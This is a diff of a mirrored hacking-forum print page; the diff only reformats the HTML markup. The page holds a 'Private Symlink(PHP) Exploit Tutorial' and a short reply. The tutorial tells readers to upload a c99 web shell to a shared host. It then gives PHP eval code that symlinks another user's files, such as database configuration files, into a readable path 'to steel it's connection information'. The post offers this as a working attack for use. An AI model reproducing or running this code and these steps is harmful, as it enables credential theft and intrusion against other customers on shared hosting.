@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=509&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:53:59 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=509&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:53:59 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Private Symlink(PHP) Exploit Tutorial by Silic0N</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,74 +41,74 @@
 		<div class="title">Private Symlink(PHP) Exploit Tutorial</div>
 	
 	<div class="content">
-		<blockquote class="restore">++++++++++++++++++++++++++++++++++++++++++++++++++  +++++<br />
-                   ~*^...Symlink(PHP) Exploit Tutorial...^*~<br />
-    ++++++++++++++++++++++++++++++++++++++++++++++++++  +++++<br />
-<br />
-~*^...LEECHERS, DON'T MAKE ANY CHANGES IN THE Tutorial...^*~<br />
-<br />
-First of all we use Symlink function to make a shortcut for any file or folder we want<br />
-<br />
-that's why this function will be very useful for us to read any folder or file we want(For More Info Use Google).<br />
-<br />
-Here We are using the Shell Named &quot;c99&quot; to execute the small code of php(Eval Code) on the shared hosting server.<br />
-<br />
-The Exploit is used to download the victim's database If and only if the victim is in a shared host<br />
-<br />
-<br />
-Download the below Shell &amp; Follow the steps.<br />
-<br />
-==================================================  ==============<br />
-Get Any C99 Shell<br />
-==================================================  ==============<br />
-<br />
-/Step 1 $ Upload the php i.e Shell.php<br />
-<br />
-Shell on your root path. That is /home/hackerz/public_html .<br />
-<br />
-/Step 2 $ Open the uploaded file . The path will look like<br />
-<br />
-==================================================  ==============================&#8203;==<br />
-<a href="../external.html?link=http://www.yoursitename.com/shell.php" target="_blank">http://www.yoursitename.com/shell.php</a><br />
-==================================================  ==============================&#8203;==<br />
-<br />
-<br />
-/Step 3 $ Next Step is read carefully the below php Eval Code . it's about 10 lines of php code.<br />
-<br />
-<br />
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#8203;!!!<br />
-<br />
-$filepath='/home/xx/public_html/xx.xx';<br />
-$sitepath='/home/xx/public_html/';<br />
-$writeblefilepath='myfile.txt';$flib=$sitepath.$wr  iteblefilepath;<br />
-@unlink($flib);<br />
-symlink($filepath, $flib);<br />
-echo readlink($flib) . &quot;\n&quot;;<br />
-echo &quot;&lt;textarea cols=30 rows=10&gt;&quot;.file_get_contents(&quot;http://&quot; . $_SERVER['HTTP_HOST'] . &quot;/&quot; . $writeblefilepath).&quot;&lt;/tex&quot; . &quot;tarea&gt;&quot;;<br />
-@unlink($flib);<br />
-<br />
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#8203;!!!!<br />
-<br />
-/Step 4 $ You should replace (xx) in the code in the upper two lines.<br />
-<br />
-In the 1st xx in the line one, means the target username.<br />
-<br />
-In the 2nd xx.xx in the line one, means the target file full path in other word it's<br />
-<br />
-usually used to read database configuration files to to steel it's connection information.<br />
-<br />
-xx in the line two, means your username. &quot;For Eg :- /home/Your_Ass/public_html/configuration.php&quot;<br />
-<br />
-$writeblefilepath, to enter any writable path on your site &amp; also it is used fo to do the link process,<br />
-<br />
-and write the output.For @unlink you can search for them on php.net .<br />
-<br />
--- -- --- -- - -- -<br />
-Loading . .. ..<br />
-- - -- - -- - -- - -- - - -<br />
-<br />
-__- -- - -- - - -- - --- - -- - -- - -- -<br />
-<br />
+		<blockquote class="restore">++++++++++++++++++++++++++++++++++++++++++++++++++  +++++<br/>
+                   ~*^...Symlink(PHP) Exploit Tutorial...^*~<br/>
+    ++++++++++++++++++++++++++++++++++++++++++++++++++  +++++<br/>
+<br/>
+~*^...LEECHERS, DON'T MAKE ANY CHANGES IN THE Tutorial...^*~<br/>
+<br/>
+First of all we use Symlink function to make a shortcut for any file or folder we want<br/>
+<br/>
+that's why this function will be very useful for us to read any folder or file we want(For More Info Use Google).<br/>
+<br/>
+Here We are using the Shell Named "c99" to execute the small code of php(Eval Code) on the shared hosting server.<br/>
+<br/>
+The Exploit is used to download the victim's database If and only if the victim is in a shared host<br/>
+<br/>
+<br/>
+Download the below Shell &amp; Follow the steps.<br/>
+<br/>
+==================================================  ==============<br/>
+Get Any C99 Shell<br/>
+==================================================  ==============<br/>
+<br/>
+/Step 1 $ Upload the php i.e Shell.php<br/>
+<br/>
+Shell on your root path. That is /home/hackerz/public_html .<br/>
+<br/>
+/Step 2 $ Open the uploaded file . The path will look like<br/>
+<br/>
+==================================================  ==============================​==<br/>
+<a href="../external.html?link=http://www.yoursitename.com/shell.php" target="_blank">http://www.yoursitename.com/shell.php</a><br/>
+==================================================  ==============================​==<br/>
+<br/>
+<br/>
+/Step 3 $ Next Step is read carefully the below php Eval Code . it's about 10 lines of php code.<br/>
+<br/>
+<br/>
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!​!!!<br/>
+<br/>
+$filepath='/home/xx/public_html/xx.xx';<br/>
+$sitepath='/home/xx/public_html/';<br/>
+$writeblefilepath='myfile.txt';$flib=$sitepath.$wr  iteblefilepath;<br/>
+@unlink($flib);<br/>
+symlink($filepath, $flib);<br/>
+echo readlink($flib) . "\n";<br/>
+echo "&lt;textarea cols=30 rows=10&gt;".file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/" . $writeblefilepath)."&lt;/tex" . "tarea&gt;";<br/>
+@unlink($flib);<br/>
+<br/>
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!​!!!!<br/>
+<br/>
+/Step 4 $ You should replace (xx) in the code in the upper two lines.<br/>
+<br/>
+In the 1st xx in the line one, means the target username.<br/>
+<br/>
+In the 2nd xx.xx in the line one, means the target file full path in other word it's<br/>
+<br/>
+usually used to read database configuration files to to steel it's connection information.<br/>
+<br/>
+xx in the line two, means your username. "For Eg :- /home/Your_Ass/public_html/configuration.php"<br/>
+<br/>
+$writeblefilepath, to enter any writable path on your site &amp; also it is used fo to do the link process,<br/>
+<br/>
+and write the output.For @unlink you can search for them on php.net .<br/>
+<br/>
+-- -- --- -- - -- -<br/>
+Loading . .. ..<br/>
+- - -- - -- - -- - -- - - -<br/>
+<br/>
+__- -- - -- - - -- - --- - -- - -- - -- -<br/>
+<br/>
 THE END.....</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -182,7 +179,7 @@ THE END.....</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore">kewl one dude..:)<br />
+		<blockquote class="restore">kewl one dude..:)<br/>
 I m gonna try it..I was in need of symlinking...:D</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_9">
@@ -201,14 +198,14 @@ I m gonna try it..I was in need of symlinking...:D</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:46 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:46 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -226,7 +223,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=509&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:53:59 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=509&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:53:59 GMT --></html>
